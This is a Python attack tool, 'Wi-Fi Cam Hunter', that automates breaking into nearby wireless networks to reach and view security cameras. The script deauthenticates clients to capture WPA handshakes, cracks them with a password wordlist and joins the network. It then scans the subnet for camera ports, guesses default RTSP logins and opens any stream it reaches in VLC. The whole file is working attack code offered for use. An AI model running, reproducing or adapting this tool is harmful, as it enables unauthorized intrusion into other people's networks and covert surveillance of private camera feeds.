#!/usr/bin/env python3

import subprocess
import time
import os
import sys
import re
import signal
from colorama import Fore, init, Style

init(autoreset=True)

print(f"{Fore.CYAN}{'='*70}")
print(f"{Fore.CYAN}  ╔══════════════════════════════════════════════════════════════╗")
print(f"{Fore.CYAN}  ║                                                              ║")
print(f"{Fore.CYAN}  ║     █████╗ ██╗   ██╗████████╗ ██████╗                        ║")
print(f"{Fore.CYAN}  ║    ██╔══██╗██║   ██║╚══██╔══╝██╔═══██╗                       ║")
print(f"{Fore.CYAN}  ║    ███████║██║   ██║   ██║   ██║   ██║                       ║")
print(f"{Fore.CYAN}  ║    ██╔══██║██║   ██║   ██║   ██║   ██║                       ║")
print(f"{Fore.CYAN}  ║    ██║  ██║╚██████╔╝   ██║   ╚██████╔╝                       ║")
print(f"{Fore.CYAN}  ║    ╚═╝  ╚═╝ ╚═════╝    ╚═╝    ╚═════╝                        ║")
print(f"{Fore.CYAN}  ║                                                              ║")
print(f"{Fore.CYAN}  ║     W I - F I   C A M   H U N T E R                          ║")
print(f"{Fore.CYAN}  ║                                                              ║")
print(f"{Fore.CYAN}  ╚══════════════════════════════════════════════════════════════╝")
print(f"{Fore.GREEN}{'='*70}")
print(f"{Fore.YELLOW}  Automatic search and hacking of Wi-Fi cameras")
print(f"{Fore.RED}  Author: Ray1N")
print(f"{Fore.GREEN}{'='*70}{Style.RESET_ALL}\n")

OUI_DB = {
    "00:1A:5B": "📡 Beeline",
    "00:0C:F1": "📡 МТС Russia",
    "00:2A:6C": "📡 Megafon Russia",
    "08:00:27": "📡 Rostelekom",
    
    "00:14:22": "🌐 TP-Link",
    "D4:8B:1C": "🌐 TP-Link",
    "E4:5F:01": "🌐 TP-Link",
    "04:18:D6": "🌐 Huawei",
    "9C:8E:CD": "🌐 Huawei",
    "C8:3A:35": "🌐 Huawei",
    "28:2C:B2": "🌐 ZTE",
    "C0:56:27": "🌐 ZTE",
    "00:00:0C": "🌐 Cisco",
    "CC:2D:21": "🌐 Cisco",
    "00:15:5D": "🌐 Asus",
    "B0:65:BD": "🌐 Asus",
    "00:50:C2": "🌐 D-Link",
    "E0:22:5D": "🌐 D-Link",
    "14:CC:20": "🌐 Xiaomi",
    "74:DA:38": "🌐 Xiaomi",
    "0C:96:BF": "🌐 Ubiquiti",
    "DC:EF:CA": "🌐 Ubiquiti",
    "00:0C:42": "🌐 MikroTik",
    "98:DA:C4": "🌐 MikroTik",
    
    "44:8A:5B": "🎥 Hikvision",
    "B4:2A:39": "🎥 Hikvision",
    "F4:8E:38": "🎥 Hikvision",
    "34:96:72": "🎥 Hikvision",
    "64:D1:54": "🎥 Hikvision",
    "90:18:7C": "🎥 Hikvision",
    "A0:63:91": "🎥 Hikvision",
    "3C:EF:8C": "🎥 Dahua",
    "7C:DD:90": "🎥 Dahua",
    "E0:50:8B": "🎥 Dahua",
    "00:1B:DD": "🎥 Axis",
    "AC:CC:8E": "🎥 Axis",
    "70:4D:7B": "🎥 TP-Link Tapo",
    "D4:38:9C": "🎥 TP-Link Tapo",
    "B4:7A:28": "🎥 Xiaomi Camera",
    "E4:8D:8C": "🎥 Xiaomi Camera",
    
    "80:00:00": "💻 Apple",
    "5C:CF:7F": "💻 Apple",
    "DC:A6:32": "💻 Apple",
    "84:16:38": "💻 Asus",
    "8C:53:C3": "💻 Dell",
    "90:5A:5A": "💻 HP",
    "94:E4:8C": "💻 Lenovo",
    "98:3C:28": "💻 LG",
    "A8:5E:45": "💻 Huawei",
    
    "54:8C:A0": "🔧 Espressif ESP8266",
    "58:8C:A0": "🔧 Espressif ESP32",
    "B8:27:EB": "🔧 Raspberry Pi",
    "50:2B:73": "🔧 Raspberry Pi",
    "3C:07:54": "🔧 Texas Instruments",
    "34:8A:9D": "🔧 Qualcomm",
    "40:6C:8F": "🔧 Broadcom",
    "48:5D:60": "🔧 MediaTek",
    "4C:66:41": "🔧 Realtek",
}
def get_vendor(mac):
    
    if not mac or mac == "00:00:00:00:00:00":
        return "❓ Broadcast/Unknown"
    
    mac_clean = mac.upper().replace("-", ":").replace(" ", "")
    parts = mac_clean.split(":")
    
    if len(parts) < 3:
        return "❓ Unknown"
    
    prefix = f"{parts[0]}:{parts[1]}:{parts[2]}"
    
    if prefix in OUI_DB:
        return OUI_DB[prefix]
    
    return "❓ Unknown Device"

def reset_interface(iface):
    subprocess.run(["pkill", "wpa_supplicant"], stderr=subprocess.DEVNULL)
    subprocess.run(["pkill", "dhclient"], stderr=subprocess.DEVNULL)
    subprocess.run(["pkill", "airodump-ng"], stderr=subprocess.DEVNULL)
    time.sleep(1)
    
    subprocess.run(["ip", "link", "set", iface, "down"], stderr=subprocess.DEVNULL)
    subprocess.run(["iwconfig", iface, "mode", "managed"], stderr=subprocess.DEVNULL)
    subprocess.run(["ip", "link", "set", iface, "up"], stderr=subprocess.DEVNULL)
    time.sleep(2)

def set_monitor_mode(iface):
    reset_interface(iface)
    subprocess.run(["ip", "link", "set", iface, "down"], stderr=subprocess.DEVNULL)
    subprocess.run(["iwconfig", iface, "mode", "monitor"], stderr=subprocess.DEVNULL)
    subprocess.run(["ip", "link", "set", iface, "up"], stderr=subprocess.DEVNULL)
    time.sleep(1)

def scan_networks(iface):
    print(f"{Fore.CYAN}[*] Scanning Wi-Fi networks...")
    
    set_monitor_mode(iface)
    
    temp_file = "/tmp/wifi_scan"
    
    airodump = subprocess.Popen([
        "airodump-ng", iface, "-w", temp_file, "--output-format", "csv"
    ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    print(f"{Fore.YELLOW}[*] Scanning for 20 seconds...")
    time.sleep(20)
    airodump.terminate()
    time.sleep(1)
    
    networks = []
    csv_file = f"{temp_file}-01.csv"
    
    if not os.path.exists(csv_file):
        print(Fore.RED + "[!] Error scanning networks")
        return []
    
    with open(csv_file, 'r', errors='ignore') as f:
        lines = f.readlines()
    
    in_ap_section = False
    for line in lines:
        if "Station MAC" in line:
            break
        if "BSSID" in line:
            in_ap_section = True
            continue
        if in_ap_section and line.strip() and not line.startswith(","):
            parts = line.strip().split(',')
            if len(parts) >= 14:
                bssid = parts[0].strip()
                if bssid and len(bssid) == 17:
                    ssid = parts[13].strip() if len(parts) > 13 else "<hidden>"
                    channel = parts[3].strip()
                    encryption = parts[5].strip()
                    if not encryption:
                        encryption = parts[4].strip()
                    signal = parts[8].strip()
                    
                    if ssid and not ssid.startswith("BSSID"):
                        networks.append({
                            "SSID": ssid if ssid else "<hidden>",
                            "BSSID": bssid,
                            "Channel": channel,
                            "Encryption": encryption if encryption else "OPEN",
                            "Signal": signal,
                            "Vendor": get_vendor(bssid)
                        })
    
    unique = {}
    for net in networks:
        if net["BSSID"] not in unique:
            unique[net["BSSID"]] = net
    
    subprocess.run(["rm", "-f", f"{temp_file}*"], stderr=subprocess.DEVNULL)
    
    return list(unique.values())

def get_clients(iface, bssid, channel):
    print(f"{Fore.CYAN}    Gathering clients on channel {channel}...")
    
    set_monitor_mode(iface)
    subprocess.run(["iwconfig", iface, "channel", str(channel)], stderr=subprocess.DEVNULL)
    
    temp_file = f"/tmp/clients_{bssid.replace(':', '')}"
    
    airodump = subprocess.Popen([
        "airodump-ng", iface, "--bssid", bssid, "-c", str(channel),
        "-w", temp_file, "--output-format", "csv"
    ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    time.sleep(15)
    airodump.terminate()
    time.sleep(1)
    
    clients = []
    csv_file = f"{temp_file}-01.csv"
    
    if os.path.exists(csv_file):
        with open(csv_file, 'r', errors='ignore') as f:
            lines = f.readlines()
        
        in_station_section = False
        for line in lines:
            if "Station MAC" in line:
                in_station_section = True
                continue
            if in_station_section and line.strip():
                parts = line.strip().split(',')
                if len(parts) >= 6:
                    client_mac = parts[0].strip()
                    if client_mac and len(client_mac) == 17 and client_mac != bssid:
                        clients.append({
                            "MAC": client_mac,
                            "Vendor": get_vendor(client_mac)
                        })
    
    subprocess.run(["rm", "-f", f"{temp_file}*"], stderr=subprocess.DEVNULL)
    return clients

def capture_handshake(iface, bssid, channel, ssid):
    print(f"\n{Fore.YELLOW}[*] Preparing to capture handshake...")
    
    set_monitor_mode(iface)
    
    subprocess.run(["iwconfig", iface, "channel", str(channel)], stderr=subprocess.DEVNULL)
    
    temp_file = f"/tmp/handshake_{bssid.replace(':', '')}"
    
    airodump = subprocess.Popen([
        "airodump-ng", iface, "--bssid", bssid, "-c", str(channel),
        "-w", temp_file, "--output-format", "cap"
    ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    print(f"{Fore.YELLOW}[*] Waiting 10 seconds for data collection...")
    time.sleep(10)
    
    print(f"{Fore.RED}[!] Sending deauthentication to {bssid}...")
    deauth = subprocess.Popen([
        "aireplay-ng", "--deauth", "10", "-a", bssid, iface
    ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    time.sleep(5)
    deauth.terminate()
    
    print(f"{Fore.YELLOW}[*] Waiting 15 seconds for handshake capture...")
    time.sleep(15)
    
    airodump.terminate()
    time.sleep(2)
    
    cap_file = f"{temp_file}-01.cap"
    
    if os.path.exists(cap_file) and os.path.getsize(cap_file) > 1000:
        print(f"{Fore.GREEN}[+] Handshake captured: {cap_file}")
        return cap_file
    
    print(f"{Fore.RED}[!] Handshake not captured")
    return None

def crack_handshake(cap_file, bssid):
    print(f"\n{Fore.CYAN}[*] Searching for wordlist...")
    
    # Change it!!!
    wordlists = [
        "~/Downloads/rockyou.txt",
        "/usr/share/wordlists/rockyou.txt.gz",
        "/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt",
        "/usr/share/seclists/Passwords/WiFi-WPA/common.txt",
        "/home/rayin/wordlist.txt"
    ]
    
    wordlist = None
    for wl in wordlists:
        if os.path.exists(wl):
            if wl.endswith('.gz'):
                print(f"{Fore.YELLOW}[*] Unpacking {wl}...")
                subprocess.run(["gunzip", "-k", wl], stderr=subprocess.DEVNULL)
                wl = wl.replace('.gz', '')
            wordlist = wl
            break
    
    if not wordlist:
        print(f"{Fore.RED}[!] Wordlist not found. Please download rockyou.txt")
        return None
    
    print(f"{Fore.CYAN}[*] Running aircrack-ng with wordlist {wordlist}...")
    
    process = subprocess.Popen([
        "aircrack-ng", cap_file, "-w", wordlist, "-l", "/tmp/password.txt"
    ], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    
    while True:
        output = process.stdout.readline()
        if output == '' and process.poll() is not None:
            break
        if output:
            if "Passphrase not in dictionary" in output:
                print(Fore.RED + "[!] Password not found in dictionary")
            elif "KEY FOUND" in output:
                print(Fore.GREEN + output.strip())
            elif "Current password" in output:
                print(Fore.YELLOW + output.strip())
    
    process.wait()
    
    if os.path.exists("/tmp/password.txt"):
        with open("/tmp/password.txt", 'r') as f:
            password = f.read().strip()
        print(f"{Fore.GREEN}{'='*50}")
        print(f"  PASSWORD FOUND: {password}")
        print(f"{'='*50}{Style.RESET_ALL}")
        return password
    
    return None

def connect_to_network(iface, ssid, password):
    print(f"{Fore.CYAN}[*] Connecting to {ssid}...")
    
    reset_interface(iface)
    
    config = f"""ctrl_interface=DIR=/var/run/wpa_supplicant
ctrl_interface_group=0
update_config=1
network={{
    ssid="{ssid}"
    psk="{password}"
    key_mgmt=WPA-PSK
}}
"""
    with open("/tmp/wpa.conf", "w") as f:
        f.write(config)
    
    subprocess.run(["wpa_supplicant", "-B", "-i", iface, "-c", "/tmp/wpa.conf"], stderr=subprocess.DEVNULL)
    time.sleep(3)
    
    subprocess.run(["dhclient", iface], stderr=subprocess.DEVNULL)
    time.sleep(2)
    
    result = subprocess.run(["ip", "addr", "show", iface], capture_output=True, text=True)
    ip_match = re.search(r"inet (\d+\.\d+\.\d+\.\d+)", result.stdout)
    
    if ip_match:
        print(f"{Fore.GREEN}[+] Connected! IP: {ip_match.group(1)}")
        return ip_match.group(1)
    
    print(Fore.RED + "[!] Failed to obtain IP")
    return None

def scan_cameras(subnet):
    print(f"{Fore.CYAN}[*] Scanning cameras in {subnet}...")
    
    ports = [80, 443, 554, 8000, 8080, 37777, 34567, 8899, 7001, 7002]
    
    cameras = []
    
    try:
        import nmap
        nm = nmap.PortScanner()
        nm.scan(hosts=subnet, arguments=f'-p {",".join(map(str, ports))} --open -T4')
        
        for host in nm.all_hosts():
            for port in nm[host]['tcp']:
                if nm[host]['tcp'][port]['state'] == 'open':
                    cameras.append({"ip": host, "port": port})
    except:
        import socket
        import ipaddress
        net = ipaddress.ip_network(subnet)
        
        for ip in net.hosts():
            ip_str = str(ip)
            for port in ports:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(1)
                    result = sock.connect_ex((ip_str, port))
                    if result == 0:
                        cameras.append({"ip": ip_str, "port": port})
                    sock.close()
                except:
                    pass
    
    return cameras

def try_rtsp(ip):
    credentials = [
        ("admin", ""),
        ("admin", "admin"),
        ("admin", "12345"),
        ("admin", "123456"),
        ("admin", "password"),
        ("root", ""),
        ("root", "root"),
        ("user", "user"),
        ("admin", "1234"),
        ("admin", "4321"),
        ("admin", "888888"),
        ("admin", "666666"),
    ]
    
    for user, pwd in credentials:
        rtsp_url = f"rtsp://{user}:{pwd}@{ip}:554/Streaming/Channels/101"
        result = subprocess.run(
            ["ffprobe", "-v", "quiet", "-print_format", "json", "-show_streams", rtsp_url],
            capture_output=True, timeout=5
        )
        if result.returncode == 0:
            return rtsp_url
        
        alt_paths = [
            f"rtsp://{user}:{pwd}@{ip}:554/stream1",
            f"rtsp://{user}:{pwd}@{ip}:554/11",
            f"rtsp://{user}:{pwd}@{ip}:554/onvif1",
            f"rtsp://{user}:{pwd}@{ip}:554/h264",
            f"rtsp://{user}:{pwd}@{ip}:554/live",
            f"rtsp://{user}:{pwd}@{ip}:554/h264/ch1/main/av_stream",
        ]
        for alt in alt_paths:
            result = subprocess.run(
                ["ffprobe", "-v", "quiet", "-print_format", "json", "-show_streams", alt],
                capture_output=True, timeout=3
            )
            if result.returncode == 0:
                return alt
    
    return None

def main():
    if len(sys.argv) < 2 or "--iface" not in sys.argv:
        print("Usage: sudo python3 camera_hunter.py --iface wlan1")
        sys.exit(1)
    
    iface = sys.argv[sys.argv.index("--iface") + 1]
    
    print(f"{Fore.RED}{'='*70}")
    print(f"  Wi-Fi CAMERA HUNTER ")
    print(f"  With support for local manufacturers")
    print(f"{'='*70}{Style.RESET_ALL}")
    
    networks = scan_networks(iface)
    
    if not networks:
        print(Fore.RED + "[!] Networks not found")
        reset_interface(iface)
        return
    
    print(f"\n{Fore.CYAN}{'='*90}")
    print(f"  FOUND NETWORKS")
    print(f"{'='*90}{Style.RESET_ALL}")
    
    for i, net in enumerate(networks, 1):
        try:
            sig = int(net["Signal"])
            if sig > -50:
                sig_color = Fore.GREEN
            elif sig > -70:
                sig_color = Fore.YELLOW
            else:
                sig_color = Fore.RED
        except:
            sig_color = Fore.WHITE
        
        if "Camera" in net["Vendor"] or "IP Camera" in net["Vendor"]:
            vendor_color = Fore.RED
        elif net["Vendor"] in ["Hikvision", "Dahua", "Axis", "Uniview"]:
            vendor_color = Fore.RED
        else:
            vendor_color = Fore.WHITE
        
        print(f"\n{Fore.YELLOW}[{i}] {Fore.WHITE}{net['SSID']}")
        print(f"    {Fore.CYAN}BSSID:{Fore.WHITE} {net['BSSID']}")
        print(f"    {Fore.CYAN}Channel:{Fore.WHITE} {net['Channel']}")
        print(f"    {Fore.CYAN}Encryption:{Fore.WHITE} {net['Encryption']}")
        print(f"    {Fore.CYAN}Signal:{Fore.WHITE} {sig_color}{net['Signal']} dBm")
        print(f"    {Fore.CYAN}Vendor:{Fore.WHITE} {vendor_color}{net['Vendor']}")
        
        clients = get_clients(iface, net['BSSID'], net['Channel'])
        print(f"    {Fore.CYAN}Clients:{Fore.WHITE} {len(clients)}")
        for client in clients[:5]:
            print(f"        {Fore.CYAN}→{Fore.WHITE} {client['MAC']} ({client['Vendor']})")
    
    while True:
        try:
            choice = input(f"\n{Fore.YELLOW}Choose network number to hack (or 0 to exit): {Fore.WHITE}")
            idx = int(choice)
            if idx == 0:
                reset_interface(iface)
                print(Fore.GREEN + "Exiting.")
                return
            if 1 <= idx <= len(networks):
                target = networks[idx-1]
                break
        except ValueError:
            pass
        print(Fore.RED + "Invalid choice")
    
    print(f"\n{Fore.GREEN}[+] Target: {target['SSID']}")
    
    if "OPEN" in target["Encryption"]:
        print(f"{Fore.GREEN}[+] Open network")
        ip = connect_to_network(iface, target['SSID'], None)
        if ip:
            subnet = ".".join(ip.split(".")[:3]) + ".0/24"
            cameras = scan_cameras(subnet)
            for cam in cameras:
                rtsp = try_rtsp(cam['ip'])
                if rtsp:
                    print(f"{Fore.GREEN}[+] CAMERA: {rtsp}")
                    subprocess.Popen(["vlc", rtsp])
        return
    
    cap_file = capture_handshake(iface, target['BSSID'], target['Channel'], target['SSID'])
    
    if not cap_file:
        print(Fore.RED + "[!] Failed to capture handshake. Please try again.")
        reset_interface(iface)
        return
    
    password = crack_handshake(cap_file, target['BSSID'])
    
    if not password:
        print(Fore.RED + "[!] Password not found in dictionary")
        reset_interface(iface)
        return
    
    ip = connect_to_network(iface, target['SSID'], password)
    
    if not ip:
        print(Fore.RED + "[!] Failed to connect")
        reset_interface(iface)
        return
    
    subnet = ".".join(ip.split(".")[:3]) + ".0/24"
    cameras = scan_cameras(subnet)
    
    if not cameras:
        print(Fore.RED + "[!] No cameras found")
        reset_interface(iface)
        return
    
    print(f"{Fore.GREEN}[+] Found devices: {len(cameras)}")
    
    for cam in cameras:
        print(f"{Fore.CYAN}[*] Checking {cam['ip']}:{cam['port']}")
        rtsp = try_rtsp(cam['ip'])
        if rtsp:
            print(f"{Fore.RED}{'='*60}")
            print(f"  CAMERA FOUND!")
            print(f"  RTSP: {rtsp}")
            print(f"{'='*60}{Style.RESET_ALL}")
            
            with open("/tmp/cameras_found.txt", "a") as f:
                f.write(f"{rtsp}\n")
            
            subprocess.Popen(["vlc", rtsp])
    
    reset_interface(iface)

if __name__ == "__main__":
    main()